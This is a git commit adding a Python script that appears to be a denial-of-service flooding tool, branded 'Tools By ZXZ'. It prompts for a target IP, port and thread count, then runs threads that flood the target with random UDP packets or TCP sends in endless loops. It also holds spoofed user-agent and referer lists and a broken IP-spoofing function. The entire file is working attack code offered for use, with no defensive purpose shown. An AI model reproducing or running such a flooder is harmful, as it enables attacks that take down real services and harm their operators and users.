2d12c10973301ae166778ccb1b7cfa03318495f8
DevterXyz <105544452+DevterXyz@users.noreply.github.com>
2022-10-01 22:53:07 +0700

    Add files via upload

---
+++ xx3.py
@@ -0,0 +1,189 @@
+import os
+import sys
+import time
+import struct
+import signal
+import socket
+import codecs
+import random
+import threading
+
+useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1","Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1","Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
+"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
+"Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
+"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
+"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
+"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
+"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
+"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
+"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
+"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
+"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
+"Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
+"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
+"Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016"]
+ref=['http://www.bing.com/search?q=',
+'https://www.yandex.com/yandsearch?text=',
+'https://duckduckgo.com/?q=']
+acceptall=["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
+"Accept-Encoding: gzip, deflate\r\n",
+"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
+"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
+"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
+"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
+"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n"
+"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
+"Accept-Language: en-US,en;q=0.5\r\n"]
+
+referers = [
+     'Your_Server_Bypassed_By_ZXZ',
+     'Your_Server_Bypassed_By_ZXZ',
+     'Your_Server_Bypassed_By_ZXZ',
+     'Your_Server_Bypassed_By_ZXZ',
+     'Your_Server_Bypassed_By_ZXZ',
+     'Your_Server_Bypassed_By_ZXZ',
+     'Your_Server_Bypassed_By_ZXZ',
+     'Your_Server_Bypassed_By_ZXZ,'
+     'Your_Server_Bypassed_By_ZXZ',
+     'Your_Server_Bypassed_By_ZXZ',
+     'Your_Server_Bypassed_By_ZXZ',
+     'Your_Server_Bypassed_By_ZXZ',
+     'Your_Server_Bypassed_By_ZXZ',
+     'Your_Server_Bypassed_By_ZXZ',
+     'Your_Server_Bypassed_By_ZXZ',
+     'Your_Server_Bypassed_By_ZXZ',
+     'Your_Server_Bypassed_By_ZXZ',
+     'Your_Server_Bypassed_By_ZXZ',
+     'Your_Server_Bypassed_By_ZXZ',
+     'Your_Server_Bypassed_By_ZXZ',
+     'Your_Server_Bypassed_By_ZXZ',
+     'Your_Server_Bypassed_By_ZXZ',
+     'Your_Server_Bypassed_By_ZXZ',
+     'Your_Server_Bypassed_By_ZXZ'
+     'Your_Server_Bypassed_By_ZXZ'
+     'Your_Server_Bypassed_By_ZXZ',
+     'Your_Server_Bypassed_By_ZXZ',
+     'Your_Server_Bypassed_By_ZXZ',
+     'Your_Server_Bypassed_By_ZXZ',
+     'Your_Server_Bypassed_By_ZXZ',
+     'Your_Server_Bypassed_By_ZXZ'
+     'Your_Server_Bypassed_By_ZXZ']
+    
+os.system("clear") 
+print("""\033[93m
+\033[32m                    ╔═╗═╗\033[93m ╦╔═╗
+\033[32m                    ╔═╝╔╩╦\033[93m╝╔═╝
+\033[32m                    ╚═╝╩ ╚═╚\033[93m═╝
+
+             \033[93m>>> \033[96mTools By ZXZ \033[93m<<<
+             \033[93m>>> \033[96mMethods : UDP - TCP \033[93m<<<
+      \033[97m
+             """)
+choice = str(input("Methods :\033[35m"))
+ip = str(input("IP Target :\033[35m"))
+port = int(input("Port Target :\033[35m"))
+times = int(input("Packets :\033[35m"))
+size = int(input("Threads :\033[35m"))
+fake_ip = '103.148.200.251'
+os.system("clear")
+Pacotes = [
+ codecs.decode('53414d5090d91d4d611e700a465b00', 'hex_codec'),
+ codecs.decode('53414d509538e1a9611e63', 'hex_codec'),
+ codecs.decode('53414d509538e1a9611e69', 'hex_codec'),
+ codecs.decode('53414d509538e1a9611e72', 'hex_codec'),
+ codecs.decode('081e62da', 'hex_codec'),
+ codecs.decode('081e77da', 'hex_codec'),
+ codecs.decode('081e4dda', 'hex_codec'),
+ codecs.decode('021efd40', 'hex_codec'),
+ codecs.decode('081e7eda', 'hex_codec')]
+ 
+def spoofer():
+    addr = [192, 168, 0, 1]
+    d = '.'
+    addr[0] = str(random.randrange(11, 197))
+    addr[1] = str(random.randrange(0, 255))
+    addr[2] = str(random.randrange(0, 255))
+    addr[3] = str(random.randrange(2, 254))
+    addr[4] = str(random.randrange(2, 256))
+    addr[5] = str(random.randrange(2, 254))
+    addr[6] = str(random.randrange(3, 256))
+    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3] + d + addr[4] + d + addr[5] + d + addr[6]
+    return assemebled
+    
+def run1():
+	data = random._urandom(1081)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+				print(f"ZXZ Attacked!!!")
+		except:
+			print(f"Down!!!")
+
+def run2():
+	data = random._urandom(1021)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+				print(f"ZXZ Attacked!!!")
+		except:
+			print(f"Down!!!")
+
+def run3():
+	data = random._urandom(999)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+				print(f"ZXZ Attacked!!!")
+		except:
+			print(f"Down!!!")
+
+def run4():
+  data = random._urandom(666)
+  while True:
+    try:
+      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+      s.connect((ip,port))
+      s.send(data)
+      for x in range(times):
+        s.send(data)
+        print(f"ZXZ Attacked!!!")
+    except:
+      s.close()
+      print(f"Down!!!")
+
+def run5():
+  data = random._urandom(16)
+  while True:
+    try:
+      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+      s.connect((ip,port))
+      s.send(data)
+      for x in range(times):
+        s.send(data)
+        print(f"ZXZ Attacked!!!")
+    except:
+      s.close()
+      print(f"Down!!!")
+
+for i in range(size):
+	if choice == 'udp':
+		fuckk = threading.Thread(target = run1)
+		fuckk.start()
+		fuck = threading.Thread(target = run2)
+		fuck.start()
+		fuckkk = threading.Thread(target = run3)
+		fuckkk.start()
+	elif choice == 'tcp':
+		fucking = threading.Thread(target = run4)
+		fucking.start()
+		fuckking = threading.Thread(target = run5)
+		fuckking.start()
